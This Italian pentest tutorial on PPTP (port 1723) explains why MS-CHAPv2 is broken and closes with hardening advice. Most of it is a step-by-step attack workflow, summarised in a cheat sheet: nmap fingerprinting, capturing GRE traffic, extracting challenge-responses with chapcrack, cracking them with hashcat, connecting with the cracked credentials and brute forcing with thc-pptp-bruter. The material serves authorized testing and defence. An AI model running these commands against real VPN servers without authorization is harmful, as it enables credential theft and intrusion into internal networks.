---
title: 'Porta 1723 PPTP: MS-CHAPv2 e Credenziali VPN'
slug: porta-1723-pptp
description: >-
  Pentest PPTP sulla porta 1723: Cos'è, fingerprint del control channel, analisi
  MS-CHAPv2, credenziali VPN legacy, GRE e rischio accesso alla rete interna.
image: /porta-1723-pptp.webp
draft: false
date: 2026-04-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - PPTP
  - GRE
  - MS-CHAPv2
---

> **Executive Summary** — La porta 1723 espone **PPTP (Point-to-Point Tunneling Protocol)**, una VPN legacy considerata **insicura e crittograficamente compromessa**. PPTP usa **MS-CHAPv2** per l’autenticazione, un protocollo noto per debolezze strutturali che permettono il recupero delle credenziali in tempi relativamente rapidi. Se trovi **PPTP attivo sulla porta 1723**, sei davanti a un finding critico: il servizio può esporre credenziali VPN, accesso remoto alla rete interna e, in molti ambienti, account riutilizzati anche in **Active Directory**. La mitigazione corretta è la **disattivazione di PPTP** e la migrazione verso **OpenVPN, WireGuard o IKEv2/IPsec**.**TL;DR**\
> **PPTP sulla porta 1723** è un protocollo VPN legacy con criticità note a livello crittografico.\
> **MS-CHAPv2** può esporre le credenziali e aumentare il rischio di compromissione degli account.\
> In ambienti enterprise, le credenziali **PPTP/VPN** coincidono spesso con quelle di **Active Directory**.\
> La presenza di **PPTP ancora abilitato** rappresenta un finding ad alto impatto e da correggere con priorità.

Porta 1723 PPTP è il canale TCP del protocollo PPTP, la VPN legacy Microsoft. La porta 1723 vulnerabilità è fondamentale: MS-CHAPv2 (il protocollo di autenticazione) è rotto per design — l'hash challenge-response è riducibile a un singolo DES a 56 bit, crackabile con CloudCracker o GPU in poche ore. L'enumerazione porta 1723 conferma la presenza di PPTP e permette di verificare i metodi di autenticazione. Nella kill chain, PPTP compromesso fornisce credenziali AD e accesso VPN alla rete interna.

## 1. Anatomia Tecnica della Porta 1723

| Componente       | Porta/Protocollo | Ruolo                             |
| ---------------- | ---------------- | --------------------------------- |
| **PPTP control** | **1723/TCP**     | **Setup tunnel (GRE)**            |
| GRE              | IP protocol 47   | Trasporto dati (no porta TCP/UDP) |
| MS-CHAPv2        | Dentro PPP       | Autenticazione                    |
| MPPE             | Dentro PPP       | Cifratura (RC4 — debole)          |

Il flusso PPTP:

1. Client si connette alla 1723/TCP — handshake PPTP
2. Tunnel GRE stabilito (protocollo IP 47 — non TCP/UDP)
3. Autenticazione PPP con MS-CHAPv2
4. Se autenticato: traffico cifrato con MPPE (RC4 128-bit, derivato dall'hash NT)

Perché è rotto: MS-CHAPv2 usa l'hash NT della password per generare il challenge-response. Moxie Marlinspike ha dimostrato nel 2012 che l'intero schema è riducibile a un singolo DES a 56 bit — crackabile in meno di 24 ore.

```
Misconfig: PPTP ancora attivo nel 2026
Impatto: tutte le credenziali sono crackabili — finding critico
Come si verifica: nmap -sV -p 1723 [target] — se open, PPTP è attivo
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 1723 10.10.10.5
```

**Output atteso:**

```
PORT     STATE SERVICE VERSION
1723/tcp open  pptp    Microsoft (Firmware: 1)
```

### Comando 2: Fingerprint PPTP

```bash
nmap -p 1723 --script pptp-version-info 10.10.10.5
```

**Output:**

```
| pptp-version-info:
|   Firmware: 1
|   Hostname: VPN-SERVER
|   Vendor: Microsoft
|_  Protocol version: 1.0
```

**Lettura dell'output:** PPTP Microsoft attivo. L'hostname `VPN-SERVER` è un'informazione aggiuntiva. La versione del protocollo 1.0 è l'unica esistente — non ci sono "versioni sicure" di PPTP.

## 3. Tecniche Offensive

**MS-CHAPv2 crack**

Contesto: hai intercettato un'autenticazione PPTP (via MitM o cattura traffico).

```bash
# Cattura traffico PPTP (GRE + PPP)
tcpdump -i eth0 'ip proto 47' -w pptp_capture.pcap

# Estrai challenge-response con chapcrack
chapcrack parse -i pptp_capture.pcap
```

**Output:**

```
username: j.smith
challenge: a1b2c3d4e5f6a7b8
response: 112233445566778899aabbccddeeff0011223344
```

```bash
# Crack con CloudCracker o hashcat
# Il response MS-CHAPv2 è riducibile a DES singolo
hashcat -m 14000 des_hash.txt -a 3 ?b?b?b?b?b?b?b?b
```

**Cosa fai dopo:** la password crackata è la password AD di `j.smith`. Testa su SMB, OWA, [VPN aziendale](https://hackita.it/articoli/porta-1194-openvpn), RDP.

**Connessione PPTP con credenziali note**

```bash
# Configura pptpsetup
pptpsetup --create pentest --server 10.10.10.5 --username j.smith --password 'Spring2026!' --encrypt --start
```

**Output:**

```
Using interface ppp0
local  IP address 10.10.10.201
remote IP address 10.10.10.5
```

**Cosa fai dopo:** connesso alla rete interna via PPTP. Da qui: scan della subnet, [enumera AD](https://hackita.it/articoli/active-directory), lateral movement.

**Brute force PPTP**

```bash
# thc-pptp-bruter
thc-pptp-bruter -u users.txt -w passwords.txt 10.10.10.5
```

## 4. Scenari Pratici

### Scenario unico: PPTP esposto su Internet

**Step 1:**

```bash
nmap -sV -p 1723 [target_ip]
```

**Step 2:** documenta come finding critico (PPTP deprecato, MS-CHAPv2 rotto)

**Step 3:**

```bash
# Se hai credenziali AD valide da altro vettore:
pptpsetup --create test --server [target] --username user --password pass --encrypt --start
```

**Raccomandazione:** migrazione immediata a OpenVPN, WireGuard o IKEv2/IPsec.

## 5. Cheat Sheet Finale

| Azione            | Comando                                                                                       |
| ----------------- | --------------------------------------------------------------------------------------------- |
| Scan              | `nmap -sV -p 1723 --script pptp-version-info [target]`                                        |
| Capture           | `tcpdump -i eth0 'ip proto 47' -w pptp.pcap`                                                  |
| Extract challenge | `chapcrack parse -i pptp.pcap`                                                                |
| Crack MS-CHAPv2   | `hashcat -m 14000 des_hash -a 3 ?b?b?b?b?b?b?b?b`                                             |
| Connect           | `pptpsetup --create test --server [target] --username user --password pass --encrypt --start` |
| Brute force       | `thc-pptp-bruter -u users.txt -w pass.txt [target]`                                           |

### Perché Porta 1723 è rilevante nel 2026

PPTP è deprecato ma ancora presente in molte organizzazioni — specialmente PMI e PA. La sua sola presenza è un finding critico perché MS-CHAPv2 è rotto per design. Le credenziali sono AD. La migrazione a protocolli moderni è la raccomandazione prioritaria.

### Hardening

* **Disabilita PPTP** — non esiste un modo per renderlo sicuro
* Migra a: OpenVPN (1194), WireGuard (51820), IKEv2/IPsec (500/4500)
* Se non puoi disabilitare immediatamente: abilita EAP-TLS (certificato client) invece di MS-CHAPv2

***

Riferimento: MS-CHAP RFC 2759, Marlinspike "Divide and Conquer" 2012. Uso esclusivo in ambienti autorizzati. [https://learn.microsoft.com/it-it/archive/msdn-technet-forums/4d573d87-9417-4229-9e0b-dbf5e58b5f9a](https://learn.microsoft.com/it-it/archive/msdn-technet-forums/4d573d87-9417-4229-9e0b-dbf5e58b5f9a)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
